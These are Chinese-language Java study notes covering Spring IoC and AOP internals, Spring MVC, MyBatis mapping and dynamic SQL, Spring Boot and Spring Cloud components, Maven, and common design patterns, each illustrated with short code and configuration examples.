
```
该接口里面包含了核心方法refresh()，是ioc容器的创建过程
```

**AnnotationConfigApplicationContext**

1、this();用来初始化reader和scaner为扫描配置文件做准备

2、register或者scan方法是用来把默认类和配置类注册到容器中

3、refresh方法也就是用户自定义类的注册

```java
public AnnotationConfigApplicationContext(Class<?>... annotatedClasses) {
		this();
		register(annotatedClasses);
		refresh();
	}

	/**
	 * Create a new AnnotationConfigApplicationContext, scanning for bean definitions
	 * in the given packages and automatically refreshing the context.
	 * @param basePackages the packages to check for annotated classes
	 */
	public AnnotationConfigApplicationContext(String... basePackages) {
		this();
		scan(basePackages);
		refresh();
	}
```



beanfactory和factoryBean，前一个是管理bean的，后一个适用于那些在配置文件中不好生成的bean（添加信息过多太繁琐的）提供了了一种自定义方式生成bean

```java
@Component
public class LiquidFactoryBean implements FactoryBean {
    public Object getObject() throws Exception {
        Liquid liquid = new Liquid();
        liquid.setId(123);
        liquid.setName("factory bean is good");
        return liquid;
    }

    public Class<?> getObjectType() {
        return null;
    }

    public boolean isSingleton() {
        return false;
    }
}
```



#### BeanDefinition

存储bean定义信息的数据结构

BeanDefinitionHolder是对BeanDefinition的封装，也就是BeanDefinition的name和其自身封装到BeanDefinitionHolder中







#### IOC容器初始化

IOC容器初始化是由前面介绍的refresh()方法来启动的。分为下面三步：

1、第一个过程时Resource的定位

2、是BeanDefintion的载入

3、向IOC容器注册这些BeanDefinition的过程



```java
@Override
	public void refresh() throws BeansException, IllegalStateException {
		synchronized (this.startupShutdownMonitor) {
			// Prepare this context for refreshing.
			prepareRefresh();

			// Tell the subclass to refresh the internal bean factory.
			ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();

			// Prepare the bean factory for use in this context.
			prepareBeanFactory(beanFactory);

			try {
				// Allows post-processing of the bean factory in context subclasses.
				postProcessBeanFactory(beanFactory);

				// Invoke factory processors registered as beans in the context.
				invokeBeanFactoryPostProcessors(beanFactory);

				// Register bean processors that intercept bean creation.
				registerBeanPostProcessors(beanFactory);

				// Initialize message source for this context.
				initMessageSource();

				// Initialize event multicaster for this context.
				initApplicationEventMulticaster();

				// Initialize other special beans in specific context subclasses.
				onRefresh();

				// Check for listener beans and register them.
				registerListeners();

				// Instantiate all remaining (non-lazy-init) singletons.
				finishBeanFactoryInitialization(beanFactory);

				// Last step: publish corresponding event.
				finishRefresh();
			}

			catch (BeansException ex) {
				if (logger.isWarnEnabled()) {
					logger.warn("Exception encountered during context initialization - " +
							"cancelling refresh attempt: " + ex);
				}

				// Destroy already created singletons to avoid dangling resources.
				destroyBeans();

				// Reset 'active' flag.
				cancelRefresh(ex);

				// Propagate exception to caller.
				throw ex;
			}

			finally {
				// Reset common introspection caches in Spring's core, since we
				// might not ever need metadata for singleton beans anymore...
				resetCommonCaches();
			}
		}
	}
```





容器初始化完成以后，客户第一次请求容器获得bean，容器才会把bean相应的依赖关系进行注入，如果提前注入可以使用lazy-init属性进行设置，在依赖完成后，容器会维持这些依赖关系



##### BeanDefintion的载入和解析

下面是载入过程，这里创建了一个XmlBeanDefinitionReader来解析beanDefintion

```java
protected void loadBeanDefinitions(DefaultListableBeanFactory beanFactory) throws BeansException, IOException {
        XmlBeanDefinitionReader beanDefinitionReader = new XmlBeanDefinitionReader(beanFactory);
        beanDefinitionReader.setEnvironment(this.getEnvironment());
        beanDefinitionReader.setResourceLoader(this);
        beanDefinitionReader.setEntityResolver(new ResourceEntityResolver(this));
        this.initBeanDefinitionReader(beanDefinitionReader);
        this.loadBeanDefinitions(beanDefinitionReader);
    }
```

这里会创建BeanDefinitionDocumentReader来读取Document树，并解析它按照bean规则

```java
public int registerBeanDefinitions(Document doc, Resource resource) throws BeanDefinitionStoreException {
        BeanDefinitionDocumentReader documentReader = this.createBeanDefinitionDocumentReader();
        int countBefore = this.getRegistry().getBeanDefinitionCount();
        documentReader.registerBeanDefinitions(doc, this.createReaderContext(resource));
        return this.getRegistry().getBeanDefinitionCount() - countBefore;
    }
```



##### Bean的注册

IOC容器DefaultListableBeanFactory用一个concurrentHashMap来管理BeanDefintion

```java
private final Map<String, BeanDefinition> beanDefinitionMap = new ConcurrentHashMap(256);
```

下面这段代码完成了注册

```java
this.beanDefinitionMap.put(beanName, beanDefinition);
```



##### bean的生命周期

![深究Spring中Bean的生命周期](java.assets/java0-1558500658.jpg)

###### beanpostProcessor

后置处理器是一个监听器，他可以监听容器触发的事件，要使用后置处理器，就需要具体的去实现BeanPostProcessor，然后配置称为bean，他有两个方法需要实现一个是applyBeanPostProcessorsBeforeInitialization，另外一个是applyBeanPostProcessorsAfterInitialization

下面的代码是applyBeanPostProcessorsBeforeInitialization的回调，把相应的bean对应的后置处理器迭代来执行相应方法

```java
public Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName) throws BeansException {
        Object result = existingBean;
        Iterator var4 = this.getBeanPostProcessors().iterator();

        do {
            if (!var4.hasNext()) {
                return result;
            }

            BeanPostProcessor beanProcessor = (BeanPostProcessor)var4.next();
            result = beanProcessor.postProcessBeforeInitialization(result, beanName);
        } while(result != null);

        return result;
```



###### beanAware

当bean需要容器的一些状态时候，可以通过实现相应Aware接口来完成

如BeanNameAware可以在bean中的到IOC容器中bean实例名称

​	ApplicationContextAware可以在bean中得到上下文服务



### AOP

诞生背景：开发过程中程序总是出现一些重复的代码，而且不太方便使用继承的方法把他们重用或管理起来。他们功能单一重复且需要在不同位置。AOP就诞生了使用aop后不仅可以将这些重复的代码抽取出来单独维护，需要使用时候统一调用。在springaop中最新的可以使用注解来植入代码

aop的原理在于[代理](#代理)技术



#### 基本概念

- Advice通知
  - 定义了在连接点做什么，为切面增强提供织入接口，提供了各种通知接口
- PointCut
  - 决定了通知应该在那个连接点（也可以是那些方法）的集合
- Advisor通知器
  - 对通知和切入点的结合



#### 代理对象

下面是主要的继承关系，ProxyConfig是一个数据基类，提供了配置属性的功能。AdvisedSupport封装了AOP对通知和通知器的相关操作。由ProxyFactoryBean来完成相关aop逻辑工作



下面是总的流程this.initializeAdvisorChain();是在初始化通知器链

```java
public Object getObject() throws BeansException {
        this.initializeAdvisorChain();
        if (this.isSingleton()) {
            return this.getSingletonInstance();
        } else {
            if (this.targetName == null) {
                this.logger.warn("Using non-singleton proxies with singleton targets is often undesirable. Enable prototype proxies by setting the 'targetName' property.");
            }

            return this.newPrototypeInstance();
        }
    }
```

然后再根据单例或者原型调用aop代理，具体的aop代理根据类有无接口来选择jdk或者cglib（JdkDynamicAopProxy和CglibProxyFactory）

具体代理对象生成是ProxyFactoryBean的基类AdvisedSupport实现中借助AopSupportFactory完成的

```java
public AopProxy createAopProxy(AdvisedSupport config) throws AopConfigException {
        if (!config.isOptimize() && !config.isProxyTargetClass() && !this.hasNoUserSuppliedProxyInterfaces(config)) {
            return new JdkDynamicAopProxy(config);
        } else {
            Class<?> targetClass = config.getTargetClass();
            if (targetClass == null) {
                throw new AopConfigException("TargetSource cannot determine target class: Either an interface or a target is required for proxy creation.");
            } else {
                return (AopProxy)(!targetClass.isInterface() && !Proxy.isProxyClass(targetClass) ? new ObjenesisCglibAopProxy(config) : new JdkDynamicAopProxy(config));
            }
        }
    }
```



### 事务

传播行为：指的就是当一个事务方法被另一个事务方法调用时，这个事务方法应该如何进行。 
例如：methodA事务方法调用methodB事务方法时，methodB是继续在调用者methodA的事务中运行呢，还是为自己开启一个新事务运行，这就是由methodB的事务传播行为决定的。



![这里写图片描述](java.assets/20170420212829825.png)

### 循环依赖

1、什么是循环依赖

两个对象创建依赖于对方

2、spring如何解决它

3、为什么要使用三级缓存解决循环依赖问题？

三级缓存的三个名字：singletonObjects、earlySingletonObjects、singletonFactories



三级缓存读取顺序：从一级缓存读，读不到就读二级缓存，二级缓存没有，就三级缓存







## Springmvc

### 工作流程

![1641953226044](java.assets/1641953226044.png)



### springmvc响应方式

1. 页面跳转
   1. 直接返回字符串
   2. 通过ModelAndView对象返回
2. 回写数据
   1. 直接返回字符串
   2. 返回对象或集合

springboot前后端分离后，返回的一般是json字符串



@**ResponseBody**注解告知mvc框架不进行师徒跳转，直接进行数据相应



<mvc:annotation-driven>自动加载处理器映射器和处理器社佩奇，并且底层继承了jackson对对象和集合进行json字符串转换



### springmvc获得请求数据

#### 获得请求参数

- 基本数据类型
  - 参数名与请求参数名一致，会自动映射匹配
- pojo类型
- 数组类型
- 集合类型
  - 当使用ajax提交时候，可以指定contentype为json形式，在方法参数位置使用**@RequestBody**可以直接接受集合数据而无需使用pojo进行包装

#### 占位符绑定

地址/user/1中的1就是要获得的请求参数，可以使用占位符绑定来获得，如/user/{id}，配合注解**@PathVariable**

```java
@RequestMapping(value ="/user/{id}")
    @ResponseBody
    public void userid(@PathVariable("id")int id){
        System.out.println(id);
    }
```







### 静态资源访问控制

```java
//开启静态资源访问
<mvc:resources mapping="/js/**" location="/js/" />
//或者使用，如果找不到就是用tomcat来寻找资源
<mvc:default-servlet-handler/>
```



### 拦截器

类似于Servlet的过滤器Fiter，用于对处理器进行预处理和后处理

将拦截器按成顺序结成链，称为拦截器链，也是AOP思想的体现，netty也应用了

通过自定义实现拦截器可以做身份验证和权限验证



![1642034961503](java.assets/1642034961503.png)



接口代码如下

```java
public interface HandlerInterceptor {
    //在请求处理之前
    boolean preHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3) throws Exception;

    //在视图渲染返回前
    void postHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3, ModelAndView var4) throws Exception;

    //请求结束之后
    void afterCompletion(HttpServletRequest var1, HttpServletResponse var2, Object var3, Exception var4) throws Exception;
}
```



### 异常处理

异常处理交给springmvc的异常处理器统一处理，而不是在业务层代码里处理异常，起到解耦的作用

![1642036329183](java.assets/1642036329183.png)





## Mybatis

原始jdbc存在的问题：

1. 数据库创建连接、释放连接频繁造成资源浪费从而影响系统性能
2. sql语句在代码中硬编码，造成代码不宜维护
3. 查询等操作，需要手动封装数据



解决方案：

1. 使用数据库连接池来管理资源
2. 将sql语句抽取出来放到xml文件中
3. 使用反射等底层技术，自动将实体表与数据库表对应属性和字段映射



**mybatis**就是上面解决方案的一个实现，让开发者只关注sql语句本身



### 开发步骤

1. 创建数据表
2. 创建实体类
3. 编写映射文件Mapper.xml
4. 编写配置文件SqlMapConfig.xml文件



#### 映射文件描述

namespace和id组成了唯一标识

![1642051109836](java.assets/1642051109836.png)

映射文件关于增删改查的配置如下

```xml
<mapper namespace="accountMapper">
    <select id="findAll" resultType="pojo.Account">
        select * from account
    </select>

    <select id="save" parameterType="pojo.Account">
        insert into account values(#{id},#{name},#{money})
    </select>

    <update id="updateById" parameterType="pojo.Account">
        update account set money=#{money} where id=#{id}
    </update>

    <delete id="deleteById" parameterType="pojo.Account">
        delete from account where id=#{id}
    </delete>
</mapper>
```



#### 核心配置文件

下面是最简单的sqlMapconfig文件配置

```xml
<configuration>
    <!--数据源环境-->
    <environments default="dev">
        <!--一个开发环境-->
        <environment id="dev">
            <transactionManager type="JDBC"></transactionManager>
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://localhost:3306/test"/>
                <property name="username" value="root"/>
                <property name="password" value="root"/>
            </dataSource>
        </environment>
    </environments>

    <!--加载映射文件-->
    <mappers>
        <mapper resource="mapper/AccountMapper.xml"/>
    </mappers>
</configuration>
```

常用配置

1、**properties**标签，可以加载外部文件

```xml
<properties resource="jdbc.properties"></properties>
```

2、typeAliases设置类型别名，之后再mapper中直接使用别名

```xml
<typeAliases>
        <typeAlias type="pojo.Account" alias="account"></typeAlias>
    </typeAliases>
```

3、mapper标签，加载映射配置

```xml
<mappers>
        <mapper resource="mapper/AccountMapper.xml"/>
    </mappers>
```



### dao层实现

**mybatis**使用动态代理实现dao层的开发，接口开发方式只需要程序员自己提供Mapper接口，会自动实现mapper的实现类

规范如下：

1. Mapper.xml中的namespace需要与mapper接口的全限定名相同
2. mapper接口方法名需要与mapper.xml文件每个标签的id相同
3. mapper接口的输入输出需要与mapper.xml的parametertype和resultype相同

![1642053247340](java.assets/1642053247340.png)

### 动态sql

#### if和where标签

下面使用if标签来判断该字段是否为空，不为空就添加该sql语句，if标签与where标签配合来生成，该语句会判断单个字段或多个字段的联合查询

```xml
    <select id="selectByCondition" resultType="user" parameterType="user">
        select * from user
        <where>
            <if test="username!=null">
                and username=#{username}
            </if>
            <if test="id!=null">
                and id=#{id}
            </if>
        </where>
    </select>
```



#### foreach标签

in语句在mybatis中用foreach标签来代替

```xml
 <select id="selectByIds" resultType="user" parameterType="list">
        select * from user
        <where>
          <foreach collection="list" open="id in(" close=")" separator="," item="id">
              #{id}
          </foreach>
        </where>
    </select>
```



#### sql和include标签

因为很多sql语句是重复的，可以通过抽取来复用，这样以后修改的时候也只需要修改一处就可以了

```xml
<!--定义sql语句，复用-->
<sql id="selectUser">select * from user</sql>

 <select id="selectByIds" resultType="user" parameterType="list">
     <!--引用上面sql语句-->
        <include refid="selectUser"/>
        <where>
          <foreach collection="list" open="id in(" close=")" separator="," item="id">
              #{id}
          </foreach>
        </where>
    </select>
```



### 插件

**mybatis**可以使用第三方插件来对功能进行扩展，如添加分页助手**pagehelper**将分页操作进行封装。

1. 导入**pagehelper**的坐标

   1. ```xml
      <dependency>
                  <groupId>com.github.pagehelper</groupId>
                  <artifactId>pagehelper</artifactId>
                  <version>4.2.0</version>
              </dependency>
              <dependency>
                  <groupId>com.github.jsqlparser</groupId>
                  <artifactId>jsqlparser</artifactId>
                  <version>0.9.1</version>
              </dependency>
      ```

      

2. 在核心配置文件中配置插件，设置拦截器

   1. ```xml
      <plugins>
              <plugin interceptor="com.github.pagehelper.PageHelper">
                  <property name="dialect" value="mysql"></property>
              </plugin>
          </plugins>
      ```

3. 测试，通过在查询前添加如下代码即可实现分页

   1. ```java
      PageHelper.startPage(1,4);
      ```

   2. 还可以通过pageinfo来获得当前的页数、是不是最后一页等分页信息

      ```java
       //获得与分页相关的参数
              PageInfo<User> userPageInfo = new PageInfo<User>(users);
              int pageNum = userPageInfo.getPageNum();
              int pageSize = userPageInfo.getPageSize();
              System.out.println(pageNum + " " + pageSize);
      ```

      

### 查询

#### 一对多查询

一个订单对应一个用户，需要在订单pojo里添加user对象，在orderMap里使用resultmap标签和assocation标签

```java
public class Order {
    private int id;
    private int uid;
    private String item;
    private User user;
}
```

select标签返回不用resultType而使用resultMap

```xml
<resultMap id="orderMap" type="order">
        <id column="id" property="id"/>
        <result column="uid" property="uid"/>
        <result column="item" property="item"/>
        <association property="user" javaType="user">
            <id column="uid" property="id"/>
            <result column="username" property="username"/>
            <result column="passwd" property="passwd"/>
            <result column="birthday" property="birthday"/>
        </association>
    </resultMap>
    <select id="selectAll" resultMap="orderMap">
        select * from ord o left join user u on o.uid=u.id
    </select>
```



#### 对对多查询

一个用户对应多个订单，因为是多个，所以用resultmap标签和collection标签配合

```java
public class User {
    private int id;
    private String username;
    private String passwd;
    private Date birthday;
    private List<Order> orders;
}
```

```xml
 <resultMap id="userMap" type="user">
        <id column="id" property="id"/>
        <result column="username" property="username"/>
        <result column="passwd" property="passwd"/>
        <result column="birthday" property="birthday"/>
        <collection property="orders" ofType="order">
            <id column="oid" property="id"/>
            <result column="item" property="item"/>
            <result column="uid" property="uid"/>
        </collection>
    </resultMap>
```



## Springboot

- parent：定义了很多的坐标版本号，做了依赖管理，已达到减轻依赖冲突的目的，后续用户添加依赖不需要指定版本号
- starter：定义了当前项目所需要的依赖坐标，已达到减少依赖配置的目的



内嵌了tomcat，把tomcat当成对象管理放在spring容器中	





### 配置文件读取

通过ConfigurationProperties注解配上前缀可以把配置文件中与该前缀相关的配置封装到java对象中，注意对象属性名要与配置文件中一样

并且需要把java对象注册到spring容器中

![1642486103150](java.assets/1642486103150.png)

该注解也可以用来配置第三方bean，如druid的datasource



### 整合第三方技术

1. 导入对应的starter
2. 根据第三方技术配置文件

下面配置mysql、mybatis和druid的导入

导入三方的pom包后，根据druid特别的配置名称来配置

```yml
spring:
  datasource:
    druid:
      driver-class-name: com.mysql.jdbc.Driver
      url: jdbc:mysql://localhost:3306/test
      username: root
      password: root
```







### 日志

```xml
<dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
            <version>1.5.2.RELEASE</version>
        </dependency>
```

![1640843034024](java.assets/1640843034024.png)

总结

1. 底层使用logback作为日志实现
2. 使用slf4j作为日志门面



### 打包

使用springboot提供的maven插件可以将工程打包成可执行的jar包

```xml
<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
					</plugin>
		</plugins>
	</build>
```

springboot会把运行该文件所需要的jar包都打包在里面，并且会在META-INF中添加额外的如下内容

```xml
//springboot的主类
Start-Class: com.mybatis.demo.DemoApplication
Spring-Boot-Classes: BOOT-INF/classes/
Spring-Boot-Lib: BOOT-INF/lib/
Build-Jdk-Spec: 1.8
Spring-Boot-Version: 2.6.2
Created-By: Maven Jar Plugin 3.2.0
//springboot启动类，他回去运行主类
Main-Class: org.springframework.boot.loader.JarLauncher
```



### 类型校验

导入pom包，validation的接口包和hibernate实现包

```xml
<dependency>
			<groupId>javax.validation</groupId>
			<artifactId>validation-api</artifactId>
		</dependency>
		<dependency>
			<groupId>org.hibernate.validator</groupId>
			<artifactId>hibernate-validator</artifactId>
		</dependency>
```

创建javabean，添加@validated注解开启属性校验

使用@Max最大值限制等注解来限制属性

```java
@Data
@Component
@ConfigurationProperties("servers")
//开启属性校验
@Validated
public class ServerConfig {
    @Max(value = 4,message = "最大值不能超过4")
    private int port;
    @DurationUnit(ChronoUnit.HOURS)
    private Duration serverTime;
    @DataSizeUnit(DataUnit.BYTES)
    private DataSize datasize;
}
```



## SpringCloud

![Spring Cloud 总体架构](java.assets/spring-cloud总体架构.jpg)

### 服务发现

`eureka`

> 基于REST的服务，本质是HTTP协议。是个去中心化的服务注册中心。
>
> eureka注册的服务需要通过心跳机制与服务器连接

![Eureka架构图](java.assets/5d723c49eca1468ab7b89af06743023c-new-imageb8aa3d41-fad4-4b38-add9-c304930ab285.png)



### 负载均衡

`Ribbo`

> 运行在消费者端的负载均衡器
>
> 其原理就是客户端获取服务列表后，根据负载均衡算法选取其中一个服务区地址请求

![img](java.assets/秒杀系统-ribbon2.jpg)



### openFeign

> 通过注解和配置减少消费者端调用的生成者的繁琐调用流程

如下，原本需要写明地址

```java
@Autowired
private RestTemplate restTemplate;
// 这里是提供者A的ip地址，但是如果使用了 Eureka 那么就应该是提供者A的名称
private static final String SERVICE_PROVIDER_A = "http://localhost:8081";

@PostMapping("/judge")
public boolean judge(@RequestBody Request request) {
    String url = SERVICE_PROVIDER_A + "/service1";
    // 是不是太麻烦了？？？每次都要 url、请求、返回类型的
    return restTemplate.postForObject(url, request, Boolean.class);
}

```

用了feign后，封装到service层

然后在Controller调用就无感了

本质其实就是使用动态代理技术代理该类的方法，隐藏了RestTemplate远程调用

```java
// 使用 @FeignClient 注解来指定提供者的名字
@FeignClient(value = "eureka-client-provider")
public interface TestClient {
    // 这里一定要注意需要使用的是提供者那端的请求相对路径，这里就相当于映射了
    @RequestMapping(value = "/provider/xxx",
    method = RequestMethod.POST)
    CommonResponse<List<Plan>> getPlans(@RequestBody planGetRequest request);
}


@RestController
public class TestController {
    // 这里就相当于原来自动注入的 Service
    @Autowired
    private TestClient testClient;
    // controller 调用 service 层代码
    @RequestMapping(value = "/test", method = RequestMethod.POST)
    public CommonResponse<List<Plan>> get(@RequestBody planGetRequest request) {
        return testClient.getPlans(request);
    }
}

```



### hystrix

> 解决分布式系统调用以来中出现的服务失败导致的服务雪崩。Hystrix通过隔离服务之间的访问点
>
> 停止服务之间的请求故障并提供后备选择。
>
> 是一个能进行服务熔断和降级的库

什么是服务雪崩？

服务请求阻塞导致的计算机资源被消耗光

![img](java.assets/Hystrix2.jpg)



**熔断**

通过熔断来解决服务雪崩问题。直接切除掉服务超时的链路



**降级**

发生了服务雪崩后，熔断机制解决了服务雪崩，为了给用户更好的体验，通过降级选择另一套方案来运行服务

如微博热点新闻请求过多后，很多用户就会看到访问页面过多请等待

```java
// 指定了后备方法调用
@HystrixCommand(fallbackMethod = "getHystrixNews")
@GetMapping("/get/news")
public News getNews(@PathVariable("id") int id) {
    // 调用新闻系统的获取新闻api 代码逻辑省略
}
//
public News getHystrixNews(@PathVariable("id") int id) {
    // 做服务降级
    // 返回当前人数太多，请稍后查看
}

```



### Zuul

> 网关
>
> 路由（隐藏真实请求路径）、限流（令牌桶）、鉴权、过滤器（Pre、Routing、Post生命周期）

![img](java.assets/zuul-sj22o93nfdsjkdsf2312.jpg)

### Config

> 集中且动态的管理配置文件
>
> 一般放在git里

![img](java.assets/config-ksksks.jpg)

但如果需要动态改变需要与消息总线Bus配合



### Bus

> 管理和广播分布式系统中的消息

![img](java.assets/springcloud-bus-s213dsfsd.jpg)





## Maven

### 是什么？

- 本质是一个项目管理工具，将项目开发和管理过程抽形成了项目对象模型(POM)
- POM（Project Object Model）

![1640786650622](java.assets/1640786650622.png)



### 仓库

仓库用于存储jar包的

**分类**

- 本地仓库：自己电脑上的仓库
- 远程仓库：非本电脑的仓库
  - 中央仓库：maven团队自己维护的仓库
  - 私服：公司范围内维护的仓库，从中央仓库获取资源



**私服作用**：

- 仅对内部开放，对外部关闭
- 保存自主研发的jar包

![1640786903393](java.assets/1640786903393.png)



### 坐标

**maven中定位资源的位置**

maven坐标组成

- groupId：定义当前的隶属组织名称
- artifactId：定义当前maven项目名称
- version：当前版本号



### 命令

- mvn compile 编译
- mvn clean 清理
- mvn test 测试
- mvn package 打包
- mvn install 安装到本地仓库



### 依赖

- 依赖的jar默认情况可以在任何地方使用，可以用个scope标签设定其范围

- 作用范围

  - main主程序范围有效
  - test测试程序范围内有效
  - package是否参与打包

  ![1640833131428](java.assets/1640833131428.png)



### 生命周期与插件

生命周期分为三个：

- clean：清理工作
- default：核心工作例如编译、测试、打包和部署
- site：产生报告、发布站点



插件与生命周期绑定，执行对应插件就执行到对应生命周期









## 设计模式

### 单例模式

需要保证类只生产一个对象

分为饿汉和懒汉模式

饿汉指在调用获得对象之前就已经生成好对象了

```java
class ThreadOk{
    private static ThreadOk threadOk = new ThreadOk();
    private ThreadOk(){
    }
    public static  ThreadOk getThreadOk(){
        return threadOk;
    }
}
```

懒汉指只有在调用获得对象时候才会去生成对象

```java
class ThreadOk{
    private static ThreadOk threadOk;
    private ThreadOk(){
    }
    public static  ThreadOk getThreadOk(){
        if(threadOk == null){
            threadOk = new ThreadOk();
        }
        return threadOk;
    }
}
```

单例又分为线程安全和非线程安全，在多线程下为了保证只生产一个对象需要加锁或者使用静态内部类来生成对象，并且内部类生成对象也属于懒汉模式

该方法不会因为加锁而降低性能，因为jvm保证多线程并发访问的正确性

```java
class ThreadOk{
    private static class InstanceHolder{
        private static ThreadOk threadOk = new ThreadOk();
    }
    private ThreadOk(){
    }
    public static synchronized ThreadOk getThreadOk(){
        return InstanceHolder.threadOk;
    }
}
```

双重锁来保证多线程安全性

```java
class ThreadOk{
    private volatile static ThreadOk threadOk;
    private ThreadOk(){
    }
    public static  ThreadOk getThreadOk(){
        if(threadOk!=null)return threadOk;
        synchronized (ThreadOk.class){
            if (threadOk==null){
                threadOk = new ThreadOk();
            }
        }
        return threadOk;
    }
}
```

使用枚举来创建单例，解决了线程安全等问题

```java
public enum SingleOk {
    INSTANCE;
    public void test(){
        System.out.println("hi");
    }
}
```



### 工厂模式

避免创建者与具体的逻辑处理相互混合，区分开来后更加清晰也更加容易扩展

```java
public class ImplFactory {
    public Impl getImpl(Class clazz)throws InstantiationException,IllegalAccessException{
        if (clazz == null) {
            return null;
        }
        return (Impl) clazz.newInstance();
    }
}

public class CarImpl implements Impl {
    @Override
    public void sendMessage(int id, String name) {
        System.out.println("car输送信息id="+id+",name="+name);
    }
}

public class Truck implements Impl {
    @Override
    public void sendMessage(int id, String name) {
        System.out.println("truck输送信息id="+id+",name="+name);
    }
}
@Test
    public void getFac()throws Exception{
        ImplFactory implFactory = new ImplFactory();
        implFactory.getImpl(CarImpl.class).sendMessage(3,"52");
        implFactory.getImpl(Truck.class).sendMessage(4,"31");
    }
```







### 模板模式

核心设计思想是通过抽象类中定义抽象方法的执行顺序，并将抽象方法设定为只有子类可以实现

好处在于模板模式定义了统一的执行标准，对于后续实现者来说不用关心调用逻辑，让每一个子类只做子类需要完成的内容



```java
public abstract class Mall {
    String id;
    String name;

    public void buy(String id){
        login(id);
        shoppingCart();
        pay();
    }
    protected abstract boolean login(String id);

    protected abstract void shoppingCart();

    protected abstract void pay();
}
public class DangDangMall extends Mall{
    protected boolean login(String id) {
        System.out.println("当当会员登录成功，id为:"+id);
        return true;
    }

    protected void shoppingCart() {
        System.out.println("当当添加物品到购物车");
    }

    protected void pay() {
        System.out.println("完成当当支付");
    }
}

public class JDmall extends Mall {
    protected boolean login(String id) {
        System.out.println("京东会员登录成功，id为:"+id);
        return true;
    }

    protected void shoppingCart() {
        System.out.println("京东添加物品到购物车");
    }

    protected void pay() {
        System.out.println("完成京东支付");
    }
}
```

测试结果如下

```java
public class Test {
    public static void main(String args[]){
        Mall mall = new JDmall();
        mall.buy("520");

        mall = new DangDangMall();
        mall.buy("520");

    }
}
京东会员登录成功，id为:520
京东添加物品到购物车
完成京东支付
当当会员登录成功，id为:520
当当添加物品到购物车
完成当当支付
```





### 观察者模式

观察者模式是当一个行为发生时候，一个用户传递消息，另一个用户接受信息并做出处理，行为和接受者之间没有直接的耦合关联

拆分了核心流程和辅助流程的代码，当需要增强其他监听器时候不需要修改额外的代码

下面创建了不同的监听器

```java
public interface EventListener {
    public void doEvent(String message);
}
public class DotaEventListener implements EventListener {
    public void doEvent(String message) {
        System.out.println("您的dota好友{}上线了"+message);
    }
}
public class LolEventListener implements EventListener{
    public void doEvent(String message) {
        System.out.println("您的lol好友{}上线了"+message);
    }
}
```

messageManage是注册、取消和通知不同类型的监听器

gameservice把核心业务和辅助业务区分了开

```java
public class MessageManage {
    private Map<EventType,List<EventListener>> listenerMap = new HashMap<EventType,List<EventListener>>();

    public MessageManage(){
        listenerMap.put(EventType.DOTA,new ArrayList<EventListener>());
        listenerMap.put(EventType.LOL,new ArrayList<EventListener>());
    }

    public enum  EventType{
        DOTA,LOL
    }
    public void subsribe(EventType eventType,EventListener eventListener){
        List listenerList = listenerMap.get(eventType);
        listenerList.add(eventListener);
    }

    public void unsubsribe(EventType eventType,EventListener eventListener){
        List listenerList = listenerMap.get(eventType);
        listenerList.remove(eventListener);

    }

    public void notify(EventType eventType,String message){
        List<EventListener> listenerList = listenerMap.get(eventType);
        for(EventListener listener:listenerList){
            listener.doEvent(message);
        }

    }
}
public class GameService {
    private MessageManage messageManage;

    public GameService(){
        messageManage = new MessageManage();
        messageManage.subsribe(MessageManage.EventType.DOTA,new DotaEventListener());
        messageManage.subsribe(MessageManage.EventType.LOL,new LolEventListener());
    }

    public void doGame(){
        String message = "liquid";
        messageManage.notify(MessageManage.EventType.DOTA,message);
        messageManage.notify(MessageManage.EventType.LOL,message);
    }
}
```



```java
public void watch(){
        GameService gameService = new GameService();
        gameService.doGame();
    }
您的dota好友{}上线了liquid
您的lol好友{}上线了liquid
```





### 适配器模式

适配器模式把本来不匹配的接口通过适配做到了统一

常见如MQ消息中，一般在系统中会定义多个MQ，每个MQ都有不同的字段，做过不做一个统一的规范，那么每个MQ都需要一个专门处理他的函数，可以把MQ中相同的字段提取出来，通过代理类可以把不同名字相同意思的字段做映射

如下为MQ消息

```java
public class CreateAccount {
    private String number;
    private String address;
    private Date accountDate;
    private String desc;

}

public class PopOrderDeliverd {
    private String uid;
    private String orderId;
    private Date orderTime;
    private Date sku;
    private Date skuName;
    private BigDecimal decimal;
}
```

统一输出的MQ

```java
public class RebateInfo {
    private String userId;
    private String bizId;
    private Date bizTime;
    private String desc;
}
```

使用适配器来对不同MQ做统一输出

```java
public class MQAdapter {
    public static RebateInfo filter(String strJson,Map<String,String> map){
        return filter(JSONObject.parseObject(strJson,Map.class),map);
    }
    //map的key是映射目的的属性，value是被映射放
    public static RebateInfo filter(Map obj,Map<String,String> map){
        RebateInfo rebateInfo = new RebateInfo();
        for(String key : map.keySet()){
            //获得被映射方的值
             Object val = obj.get(map.get(key));
             RebateInfo.class.getMethod("set"+key.substring(0,1).toUpperCase()
                     +key.substring(1),String.class).invoke(rebateInfo,val.toString());
        }
        return rebateInfo;
    }
}

```

之后对其测试

```java
@Test
    public void adapter()throws NoSuchMethodException,InvocationTargetException,IllegalAccessException{
        CreateAccount createAccount = new CreateAccount();
        createAccount.setAddress("北京朝阳");
        createAccount.setDesc("liquid love mavis");
        createAccount.setAccountDate(new Date());
        createAccount.setNumber("520");

        Map<String,String> map = new HashMap<String, String>();
        map.put("userId","number");
        map.put("bizId","address");
       // map.put("bizTime","accountDate");
        map.put("desc","desc");
        RebateInfo rebateInfo = MQAdapter.filter(JSONObject.toJSONString(createAccount),map);

        System.out.println(JSON.toJSONString(createAccount));
        System.out.println(JSON.toJSONString(rebateInfo));
    }

输出入下
{"accountDate":1635858351763,"address":"北京朝阳","desc":"liquid love mavis","number":"520"}
{"bizId":"北京朝阳","desc":"liquid love mavis","userId":"520"}
```

 



### 迭代器模式

java实现迭代器需要实现Collection集合接口，该接口提供了集合能提供的添加删除元素操作，并且Colletion接口继承自Iterable接口

```java
public interface Collection<E> extends Iterable<E> 
```

该接口提供了能够获得Iterator的方法

![1637891341416](java.assets/1637891341416.png)

获得的Iterator类中包含了hasNext和next的方法

java所以实现Collection的类都必须可以返回一个迭代器遍历数据

```java
public interface Iterator<E> {	
	boolean hasNext();
	E next();
}
```

